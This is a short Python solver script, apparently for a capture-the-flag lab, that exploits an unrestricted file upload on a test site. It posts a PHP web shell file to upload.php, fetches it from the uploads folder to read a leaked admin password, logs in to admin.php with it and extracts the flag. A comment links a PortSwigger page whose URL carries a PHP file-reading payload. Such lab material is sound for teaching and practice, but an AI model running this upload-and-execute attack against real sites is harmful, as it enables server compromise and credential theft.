import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

# https://portswigger.net/web-security/file-upload#:~:text=%3C%3Fphp%20echo%20file_get_contents(%27/path/to/target/file%27)%3B%20%3F%3E

BASE_URL = "https://php-up.quoccacorp.com"
PAYLOAD_FILENAME = "php_up.web_shell.php"

class Solver:
    def __init__(self):
        self.session = get_session()

    def main(self):
        with open(PAYLOAD_FILENAME, "rb") as file:
            response = self.session.post(f"{BASE_URL}/upload.php", files={"file": file})

        response = self.session.get(f"{BASE_URL}/uploads/{PAYLOAD_FILENAME}")
        password = response.text.strip()

        response = self.session.post(f"{BASE_URL}/admin.php", data={"pass": password})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()